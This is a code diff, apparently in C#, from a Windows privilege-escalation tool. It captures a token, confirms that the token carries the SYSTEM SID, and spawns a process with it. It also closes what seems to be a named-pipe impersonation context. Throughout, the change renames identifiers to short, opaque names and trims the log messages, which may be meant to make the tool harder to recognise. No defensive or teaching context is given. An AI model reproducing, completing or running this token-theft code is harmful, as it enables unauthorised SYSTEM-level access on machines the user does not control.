-                string il = Tok.GetIL(id.Token);
-                Log.Info("SID: " + sid);
-                Log.Info("IL : " + il);
+                string sid = Pv.Sid(id.Token);
+                string il = Pv.Il(id.Token);
+                Tr.I("SID: " + sid);
+                Tr.I("IL : " + il);
 
-                if (sid != K.SYSTEM_SID)
-                {
-                    Log.Fail("Not SYSTEM — aborting");
-                    return;
-                }
-                Log.Ok("SYSTEM token captured");
+                if (sid != C.SYSTEM_SID) { Tr.F("not SYSTEM"); return; }
+                Tr.O("SYSTEM captured");
 
                 PROCESS_INFORMATION pi;
-                if (!Tok.SpawnProcess(id.Token, cmd, out pi))
-                { Log.Fail("Process creation failed"); return; }
+                if (!Pv.Run(id.Token, cmd, out pi)) { Tr.F("spawn failed"); return; }
 
-                if (pi.hThread != IntPtr.Zero) N.CloseHandle(pi.hThread);
-                if (pi.hProcess != IntPtr.Zero) N.CloseHandle(pi.hProcess);
-
-                Log.Ok("Done.");
+                if (pi.hThread != IntPtr.Zero) W.CloseHandle(pi.hThread);
+                if (pi.hProcess != IntPtr.Zero) W.CloseHandle(pi.hProcess);
+                Tr.O("done");
             }
             catch (Exception e)
             {
-                Log.Fail(e.GetType().Name + ": " + e.Message);
-                if (e.InnerException != null)
-                    Log.Fail("  inner: " + e.InnerException.Message);
+                Tr.F(e.GetType().Name + ": " + e.Message);
+                if (e.InnerException != null) Tr.F("  " + e.InnerException.Message);
             }
             finally
             {
-                if (ctx != null)
+                if (env != null)
                 {
-                    if (needRestore) ctx.Restore();
-                    try { ctx.StopPipe(); } catch { }
+                    if (attached) env.Detach();
+                    try { env.Stop(); } catch { }
                 }
             }
         }
